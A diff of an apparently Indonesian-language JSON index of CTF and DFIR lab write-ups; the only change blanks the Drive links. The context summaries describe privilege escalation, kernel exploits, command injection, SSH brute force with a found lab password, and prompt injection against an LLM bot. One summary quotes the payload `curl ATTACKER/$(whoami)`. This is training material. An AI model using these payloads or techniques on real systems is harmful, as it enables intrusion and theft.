@@ -385,7 +385,7 @@
       "Tracing aktivitas attacker dari log"
     ],
     "summary": "Compromise assessment Linux server: analisis log autentikasi, bash history, cron jobs, dan SSH keys untuk identifikasi persistence dan tracing aktivitas attacker.",
-    "url": "https://drive.google.com/file/d/1KAIHTcnEns8GHIAPhE-1mQ-cDTJNNXNu/view?usp=drive_link"
+    "url": ""
   },
   {
     "id": "thm-recruit",
@@ -427,7 +427,7 @@
       "Identifikasi SQL injection dari source code"
     ],
     "summary": "Web exploitation challenge: SSRF chained ke LFI, SQL injection exploitation, dan source code review untuk identify vulnerability dari sisi developer.",
-    "url": "https://drive.google.com/file/d/1Sxjg6C8e8u_HE5qXXDmEW2nua_2gCrOe/view?usp=drive_link"
+    "url": ""
   },
   {
     "id": "thm-breakme",
@@ -469,7 +469,7 @@
       "Chaining web exploit ke kernel exploit"
     ],
     "summary": "Privilege escalation chain: exploit WordPress CVE-2023-1874 untuk initial access, lalu Dirty Pipe (CVE-2022-0847) untuk root via Linux kernel page cache vulnerability.",
-    "url": "https://drive.google.com/file/d/1EXr7xdiIazy8QhoweVwCN2X2Kc4mS_hm/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "thm-masquerade",
@@ -513,7 +513,7 @@
       "Identifikasi TrevorC2 traffic pattern"
     ],
     "summary": "DFIR challenge full chain: PowerShell deobfuscation, RC4/AES decryption keys recovery, .NET binary reverse engineering pakai dnSpy, dan analisis TrevorC2 C2 traffic dari pcap.",
-    "url": "https://drive.google.com/file/d/19PdgOzOFkCvMPHtSlneUB4oVgtQQCumQ/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "netforge-pr1-osi-tcp",
@@ -1080,7 +1080,7 @@
       "Calculate total ZIP size dari start dan end offset"
     ],
     "summary": "Identifikasi ending offset ZIP file Diskrupt = 0x4E7B0E43D (last byte of EOCD record). Search 50 4B 05 06 di HxD setelah Q9 starting offset, found EOCD di 0x4E7B0E428. Last byte ZIP = start EOCD + 21 = 0x4E7B0E43D. Total ZIP size = 1086 bytes (kecil, indicate single small file content). Pembelajaran: try multiple submission formats untuk pertanyaan ambigu.",
-    "url": "https://drive.google.com/file/d/1vUpzpy5d8GYPMef1xo8l9mqNOTnuFSjH/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "thm-diskrupt-q11",
@@ -1130,7 +1130,7 @@
       "Identify hint untuk pertanyaan berikutnya dari narrative"
     ],
     "summary": "Extract ZIP file dari disk image Diskrupt range 0x4E7B0E000-0x4E7B0E43D pakai HxD block selection. Content: secret_plan.txt (internal memo attacker dengan FLAG:{RECOVERED_SECRET_THM}). Memo reveal narrative lengkap exfiltration: extract data, create stolen.zip, store on USB, delete entries, clear prefetch, overwrite FAT table. Setiap claim attacker match dengan investigation findings dari Q1-Q10. Hint 'last known document' dan 'FAT table overwrite' jadi clue untuk Q12.",
-    "url": "https://drive.google.com/file/d/1vUpzpy5d8GYPMef1xo8l9mqNOTnuFSjH/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "thm-diskrupt-q12",
@@ -1178,7 +1178,7 @@
       "Multi-pass review: re-examine evidence dari pertanyaan sebelumnya dengan context baru"
     ],
     "summary": "Identifikasi disk wiping tool di Diskrupt = DiskWipe.exe (di FAT32 partition root, status deleted). Tool ini attacker gunakan untuk overwrite FAT table sebagai anti-forensics setelah complete exfiltration (sesuai claim di secret_plan.txt). Pattern install-then-delete dengan dua MSI*.tmp entries dan deleted .exe entries adalah signature professional anti-forensics behavior. ROOM DISKRUPT COMPLETED 12/12!",
-    "url": "https://drive.google.com/file/d/1vUpzpy5d8GYPMef1xo8l9mqNOTnuFSjH/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-joedway",
@@ -1252,7 +1252,7 @@
       "Q7 (exfil.ps1 body): script tidak bisa di-recover dari artefak yang tersedia — UNSOLVED"
     ],
     "summary": "Joedway adalah CTF DFIR challenge di Hacktrace Ranges (Moderate, 20pts) dengan skenario Windows compromise via NPM supply chain attack + ClickFix. Solved 11/12 pertanyaan. Chain: attacker deliver malicious NPM package dengan postinstall hook → ClickFix trick user jalankan encoded PowerShell → drop encrypted payload (JOEDWAY! magic header, xsalsa20poly1305) → eksfiltrasi. Tools utama: 7z (WIM), tshark (PCAP), sqlite3 (browser history), LnkParse3 (LNK), pynacl (decrypt). Q7 (exfil.ps1 content) unsolved karena script body tidak bisa di-recover dari artefak yang ada di image.",
-    "url": "https://drive.google.com/file/d/1pF5XAoDPYrfmxcYmFmKFSDiWDECePE9G/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "kali-vm-terminal-hang-rca",
@@ -1525,7 +1525,7 @@
       "Eksekusi DirtyFrag chain (CVE-2026-43284 + CVE-2026-43500) untuk privilege escalation ke root"
     ],
     "summary": "Pwn box Obscura dari Hacktrace Ranges (Easy, Linux, OS Maker: 0punK) dalam ~1 jam 15 menit, user + root (2/2). Attack chain: Next.js dev mode aktif → __NEXT_DATA__ enumerate internal structure → webpack source map base64 extraction dari /_next/static/chunks/ untuk recover source code → stack trace leak (ENOTDIR) membocorkan username + app path → hidden credential di /files/README.md untuk user flag → privilege escalation via DirtyFrag (chain CVE-2026-43284 xfrm-ESP + CVE-2026-43500 RxRPC Page-Cache Write) untuk root. Key learning: Next.js dev mode misconfiguration adalah attack surface yang underrated; DirtyFrag adalah exploit class baru turunan DirtyPipe dengan deterministic logic bug.",
-    "url": "https://drive.google.com/file/d/13Fgjl2crKrnHtLXhh50mlVKYQ6ql_kJV/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "revenge-phase1-nim-malware-re",
@@ -2261,7 +2261,7 @@
       "Exploit LXD group membership untuk escape container privilege boundary dan achieve host root"
     ],
     "summary": "Full chain compromise Echo dari Hacktrace Ranges (Easy): prompt injection pada HR Bot untuk exfil credential → credential reuse ke n8n workflow platform → broken access control Public API bypass → RCE via n8n Code node → LXD privilege escalation ke host root. First Blood untuk user flag dan root flag. Chain ini mencakup LLM security (prompt injection), workflow automation platform abuse (n8n), dan Linux container escape via LXD group privilege.",
-    "url": "https://drive.google.com/file/d/1vF4EWq2qUEsZ0yusnkeFgarhfivIiYws/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-altlayer-web-enum",
@@ -2488,7 +2488,7 @@
       "Memahami bagaimana parameter yang tidak disanitasi diinterpolasi ke shell command chain untuk menghasilkan RCE"
     ],
     "summary": "Phase initial access Cannonbolt (Hacktrace Ranges, Moderate, Offensive): eksploitasi CVE-2025-52665 pada UniFi OS — unauthenticated RCE via backup restore API yang menerima parameter tanpa sanitasi, memungkinkan command injection langsung ke shell command chain. Recon via full port scan Nmap dan manual endpoint probing dengan curl.",
-    "url": "https://drive.google.com/file/d/1PwNndRjLnMBUFGTBvlOM3lE34_EXQIrR/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-cannonbolt-shell-privesc",
@@ -2539,7 +2539,7 @@
       "Eksekusi arbitrary script sebagai root via BASH_ENV yang diarahkan ke file milik user"
     ],
     "summary": "Phase post-exploitation Cannonbolt: delivery reverse shell dari RCE payload, stabilisasi session menggunakan pwncat-cs. Privesc via sudo env_keep BASH_ENV — NOPASSWD bash script yang dapat dipanggil sudo tidak sanitasi environment variable, sehingga BASH_ENV diarahkan ke arbitrary script yang dieksekusi sebagai root.",
-    "url": "https://drive.google.com/file/d/1PwNndRjLnMBUFGTBvlOM3lE34_EXQIrR/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-cannonbolt-ctf-methodology",
@@ -2578,7 +2578,7 @@
       "Membaca maker-provided clue sebagai bagian dari recon yang terstruktur, bukan sebagai hints yang dihindari"
     ],
     "summary": "Lesson metodologi CTF dari Cannonbolt: brute-force yang berlarut-larut merupakan sinyal bahwa approach salah — maker sudah menyediakan clue direktif yang perlu dibaca lebih awal. Recon yang efektif mencakup kemampuan mengenali kapan harus berhenti dari enumeration brute-force dan beralih ke analisis manual terhadap petunjuk yang tersedia.",
-    "url": "https://drive.google.com/file/d/1PwNndRjLnMBUFGTBvlOM3lE34_EXQIrR/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-noextraordinary-stored-xss",
@@ -2755,7 +2755,7 @@
       "Identify bahwa access control bergantung pada nilai cookie yang client-controlled, bukan server-side session validation"
     ],
     "summary": "Bypass HTTP 403 pada admin panel ClashOrCrash via cookie forgery (admin_login=true). Root cause: server melakukan access control check berdasarkan nilai cookie yang sepenuhnya dikontrol oleh client, bukan server-side session token yang divalidasi. Klasifikasi OWASP A01:2021 Broken Access Control — salah satu kategori kerentanan paling umum di web applications.",
-    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-clashorcrash-stored-cmdi",
@@ -2806,7 +2806,7 @@
       "Identify stored injection pattern vs reflected injection: perlu explore secondary endpoints yang mungkin memproses stored data"
     ],
     "summary": "RCE pada ClashOrCrash via stored command injection di field playertag — payload backtick (`curl ATTACKER/$(whoami)`) disimpan ke database saat POST ke submit endpoint, kemudian dieksekusi oleh bash_eval/shell_exec ketika export.php memproses data tersebut. Key learning: stored injection berbeda dari reflected — injection point dan execution point adalah endpoint yang berbeda, sehingga payload tidak triggered saat submit tapi saat processing endpoint diakses.",
-    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-clashorcrash-crash-report",
@@ -2848,7 +2848,7 @@
       "Trace bagaimana playertag data flows dari submit endpoint ke export.php dan diproses oleh bash_eval"
     ],
     "summary": "Analisis crash report ClashOrCrash untuk identifikasi vulnerable functions (bash_eval, shell_exec) dan trace injection path melalui export.php. Crash report membocorkan stack trace yang menunjukkan fungsi-fungsi berbahaya dalam call chain, memungkinkan attacker untuk memahami code execution path tanpa perlu akses ke source code. Teknik ini fundamental dalam black-box web exploitation ketika source code tidak tersedia.",
-    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-clashorcrash-gtfobins-zile",
@@ -2897,7 +2897,7 @@
       "Navigate Zile interface untuk reach shell-command functionality: M-x adalah prefix key untuk execute named commands di Zile/Emacs-like editors"
     ],
     "summary": "Lateral movement dari www-data ke barbarian_king di ClashOrCrash via Zile text editor GTFOBins entry. sudo -l menunjukkan www-data diizinkan jalankan /usr/bin/zile sebagai barbarian_king tanpa password. Dari dalam Zile, M-x shell-command mengeksekusi arbitrary shell commands dalam context user barbarian_king. Key learning: GTFOBins bukan hanya untuk privesc ke root — juga berlaku untuk lateral movement antar user.",
-    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-clashorcrash-dirtyfrag",
@@ -2950,7 +2950,7 @@
       "Distinguish DirtyFrag target version: exploit hanya work pada sudo versi spesifik yang match dengan binary di /opt/"
     ],
     "summary": "Privilege escalation dari barbarian_king ke root di ClashOrCrash via DirtyFrag exploit terhadap SUID sudo binary non-standard di /opt/sudo-1.9.13p3/bin/sudo. SUID enumeration (find / -perm -4000) mengungkap sudo versi lama yang vulnerable di path non-default. DirtyFrag dicompile dengan GCC menggunakan TMPDIR=/dev/shm sebagai workaround karena /tmp tidak writable. Key learning: SUID enumeration harus mencakup seluruh filesystem, bukan hanya /usr/bin/ — custom/legacy binaries di /opt/ sering jadi overlooked attack surface.",
-    "url": "https://drive.google.com/file/d/1hfeO5Z5gveRmi_MGnTr7q8sOg7osc2qh/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-ftp-enum",
@@ -3005,7 +3005,7 @@
       ".cache/ directory accessible listing tapi permission 700 block traversal"
     ],
     "summary": "Enumerasi FTP anonymous di Overthinking (Hacktrace Ranges, Easy, postponed) mengungkap home directory exposure via vsftpd: FTP root di-map ke home directory uid 1001. ls -la reveal dotfiles yang disembunyikan dir, termasuk .bash_history (188 bytes, permission 600) dan .cache/ (permission 700). Key learning: selalu gunakan ls -la bukan dir di FTP untuk reveal hidden files; permission Unix tetap berlaku — file visible di listing belum tentu readable.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-ftp-530",
@@ -3053,7 +3053,7 @@
       "Distinguish apakah 530 karena wrong password atau karena username diblokir — timing dan response message berbeda"
     ],
     "summary": "Analisis FTP response code di Overthinking: vsftpd return 530 sebelum password prompt untuk semua named users (Rafi, Azki, dll), mengindikasikan username diblokir di level userlist (userlist_deny/userlist_enable config) bukan di authentication layer. Berbeda dari 331 yang artinya username diterima dan server menunggu password. Key learning: 530 pre-password = brute force FTP password sia-sia untuk user tersebut; fokus ke protocol lain (SSH) yang tidak memiliki restriction yang sama.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-cred-analysis",
@@ -3105,7 +3105,7 @@
       "Filipus memiliki password berbeda (Nj82@1Waqk90$@%pass123) — mungkin intended sebagai rabbit hole atau correct credential dengan parsing yang belum tepat"
     ],
     "summary": "Analisis credential format ambiguous dari creds.txt Overthinking: format `user : left@%right` dengan @%pass123 suffix konsisten di semua user kecuali Filipus. Hex dump (xxd) mengkonfirmasi clean ASCII tanpa hidden characters. Exhaustive combo testing (full string, split-left, split-right, concat, machine name, story keywords) via Hydra 2,655 attempts → 0 valid. Key learning: credential format ambiguity membutuhkan systematic combo generation; null result tidak berarti salah jalur — bisa machine state issue (perlu revert) atau parsing interpretation yang belum dicoba.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-meta-hints",
@@ -3152,7 +3152,7 @@
       "Machine name 'Overthinking' sebagai reminder: jika approach terlalu complex, step back dan pertimbangkan vector yang lebih simple yang mungkin terlewat"
     ],
     "summary": "Analisis CTF meta-hints dari Overthinking (Hacktrace Ranges, Easy, postponed): background story 'Sometimes behaviour is a crucial information for attacker' secara langsung mengarah ke .bash_history (behaviour = command history) sebagai key artifact — ditemukan via ls -la tapi blocked oleh permission 600. Machine name 'Overthinking' adalah meta-hint bahwa solusi seharusnya straightforward; jika stuck karena complexity, pertimbangkan apakah approach sudah over-engineered. Key learning: CTF background story dan machine name adalah bagian dari puzzle, bukan flavor text — selalu map keywords story ke teknik/artifact konkret.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-nmap-recon",
@@ -3196,7 +3196,7 @@
     ],
     "problems": [],
     "summary": "Full port scan terhadap target overthinking.htr menghasilkan 2 port terbuka: 21/FTP (vsftpd 3.0.5, anonymous login allowed) dan 22/SSH (OpenSSH 8.2p1). Tidak ada web server atau service lain yang exposed. Anonymous FTP menjadi entry point utama untuk enumerasi lanjutan.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-ftp-loot",
@@ -3241,7 +3241,7 @@
       "Named users (Rafi, Azki, dll) di-reject oleh FTP di level username (530), bukan password level"
     ],
     "summary": "Anonymous FTP access mengungkap folder Data/ berisi creds.txt (5 pasang credential: Rafi, Azki, Bryan, Amel, Filipus) dan hai.txt. Semua password memiliki suffix @%pass123 yang konsisten. Pola ini menjadi kunci strategi brute force yang terarah — suffix adalah bagian dari password format, bukan credential literal.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-wordlist-mutation",
@@ -3285,7 +3285,7 @@
       "Over-complicated approach (parsing @% berbagai cara, SecLists filtering, manual combo) sebelum menyadari solusi sederhana: append suffix ke standard wordlist"
     ],
     "summary": "Breakthrough setelah stuck: suffix @%pass123 bukan delimiter untuk diparsing, melainkan bagian yang harus di-append ke setiap kata di rockyou.txt. sed 's/$/@%pass123/' menghasilkan mutated wordlist 14.3 juta entry. Key learning: pattern recognition dari credential dump lebih valuable dari brute force complexity — satu insight sederhana (suffix = password component) unlock seluruh attack path.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-hydra-ssh",
@@ -3328,7 +3328,7 @@
       "Password ditemukan dalam ~13 menit karena 'gatito' muncul relatif awal di rockyou — estimasi worst-case tidak berarti runtime aktual"
     ],
     "summary": "Hydra berhasil menemukan kredensial SSH azki:gatito@%pass123 dalam ~13 menit meski rate brute force hanya 53-63 tries/min. Posisi 'gatito' yang relatif awal di rockyou.txt membuat proses jauh lebih cepat dari estimasi worst-case. Initial access ke target berhasil via SSH sebagai azki.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-post-exploitation",
@@ -3372,7 +3372,7 @@
     ],
     "problems": [],
     "summary": "Post-exploitation enumeration sebagai azki: sudo -l denied, tapi .bash_history mengungkap user sebelumnya pernah gunakan tar untuk baca /etc/shadow. File shadow.tar dan folder etc/ di home directory mengkonfirmasi aktivitas tersebut. getcap menunjukkan /bin/tar memiliki cap_dac_read_search+ep — ini adalah privesc vector yang dimaksud.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-cap-dac-tar",
@@ -3417,7 +3417,7 @@
       "Awalnya sempat memulai cracking root password hash dari /etc/shadow — tidak perlu, tar capability sudah cukup untuk baca root flag secara langsung"
     ],
     "summary": "/bin/tar memiliki cap_dac_read_search+ep — capability yang bypass seluruh DAC read permission. Tar digunakan untuk archive /root/ directory langsung, kemudian diekstrak untuk baca root flag tanpa perlu jadi root secara literal. Key learning: getcap adalah mandatory step di post-exploitation; misconfigured capability pada binary umum seperti tar = full read access setara root.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   },
   {
     "id": "hacktrace-overthinking-writeup-doc",
@@ -3450,6 +3450,6 @@
     "commands": [],
     "problems": [],
     "summary": "Membuat writeup formal Overthinking dalam format DOCX dengan tema merah (offensive), meliputi attack flow diagram SVG, screenshot placeholders, tabel informasi mesin, dan section lessons learned. Writeup mencakup seluruh fase recon sampai privilege escalation, ditulis dalam perspektif monolog formal Bahasa Indonesia. Dokumentasi stuck points (3-4 hari wordlist tanpa mutasi) menjadi bagian paling valuable dari writeup.",
-    "url": "https://drive.google.com/file/d/1xhdAEbNpCrBC128ipg33TvBnQY3eSv6L/view?usp=sharing"
+    "url": ""
   }
 ]
